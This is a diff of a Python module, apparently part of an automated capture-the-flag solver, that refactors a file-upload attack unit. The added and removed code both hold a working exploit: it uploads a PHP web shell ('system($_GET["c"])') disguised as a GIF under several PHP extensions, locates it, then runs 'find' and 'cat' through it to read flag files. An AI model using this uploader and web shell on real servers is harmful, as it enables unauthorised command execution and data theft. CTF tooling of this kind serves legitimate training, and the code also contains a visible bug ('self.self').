@@ -116,51 +116,47 @@ class Unit(web.WebUnit):
         if not file:
             return  # This will tell THE WHOLE UNIT to stop!
 
-        if action and method and upload and file:
-            if action:
-                action = action[0].decode("utf-8")
-            if action.startswith(self.target.url_root):
-                action = action[len(self.target.url_root) :].decode("utf-8")
-            if method:
-                method = method[0].decode("utf-8")
-            if file:
-                file = file[0].decode("utf-8")
-
-            try:
-                method = vars(requests)[method.lower()]
-            except IndexError:
-                # Could not find an appropriate HTTP method... defaulting to POST!"
-                method = requests.post
-
-            extensions = ["php", "gif", "php3", "php5", "php7"]
-
-            for ext in extensions:
-                r = method(
-                    self.target.upstream.decode("utf-8").rstrip("/") + "/" + action,
-                    files={
-                        file: (
-                            "anything.%s" % ext,
-                            StringIO(
-                                f'GIF89a;{web.delim}<?php system($_GET["c"]) ?>{web.delim}'
-                            ),
-                            "image/gif",
-                        )
-                    },
-                )
-
-                potential_location_regex = "href=[\"'](.+?.%s)[\"']" % ext
-
-                location = re.findall(
-                    potential_location_regex, r.text, flags=re.IGNORECASE
-                )
-                if location:
-                    for file_path in location:
-                        if file_path.startswith(self.target.url_root):
-                            file_path = file_path[len(self.self.target.url_root) :]
-                        yield (method, action, file, ext, location, file_path)
-
-        else:
+        if not action or not method or not upload:
             return  # This will tell THE WHOLE UNIT to stop!
+        action = action[0].decode("utf-8")
+        if action.startswith(self.target.url_root):
+            action = action[len(self.target.url_root) :].decode("utf-8")
+        if method:
+            method = method[0].decode("utf-8")
+        if file:
+            file = file[0].decode("utf-8")
+
+        try:
+            method = vars(requests)[method.lower()]
+        except IndexError:
+            # Could not find an appropriate HTTP method... defaulting to POST!"
+            method = requests.post
+
+        extensions = ["php", "gif", "php3", "php5", "php7"]
+
+        for ext in extensions:
+            r = method(
+                self.target.upstream.decode("utf-8").rstrip("/") + "/" + action,
+                files={
+                    file: (
+                        f"anything.{ext}",
+                        StringIO(
+                            f'GIF89a;{web.delim}<?php system($_GET["c"]) ?>{web.delim}'
+                        ),
+                        "image/gif",
+                    )
+                },
+            )
+
+            potential_location_regex = "href=[\"'](.+?.%s)[\"']" % ext
+
+            if location := re.findall(
+                potential_location_regex, r.text, flags=re.IGNORECASE
+            ):
+                for file_path in location:
+                    if file_path.startswith(self.target.url_root):
+                        file_path = file_path[len(self.self.target.url_root) :]
+                    yield (method, action, file, ext, location, file_path)
 
     def evaluate(self, case: Any):
         """
@@ -191,13 +187,11 @@ class Unit(web.WebUnit):
                     params={"c": f"find / -name {flagname}"},
                 )
 
-                flag_locations = re.findall(
+                if flag_locations := re.findall(
                     f"{web.delim}(.+?){web.delim}",
                     r.text,
                     flags=re.MULTILINE | re.DOTALL,
-                )
-
-                if flag_locations:
+                ):
                     flag_locations = flag_locations[0]
 
                     for fl in flag_locations.split("\n"):
@@ -208,12 +202,11 @@ class Unit(web.WebUnit):
                             params={"c": f"cat {fl}"},
                         )
 
-                        flag = re.findall(
+                        if flag := re.findall(
                             f"{web.delim}(.+?){web.delim}",
                             r.text,
                             flags=re.MULTILINE | re.DOTALL,
-                        )
-                        if flag:
+                        ):
                             flag = flag[0]
                             self.manager.register_data(self, flag)
 
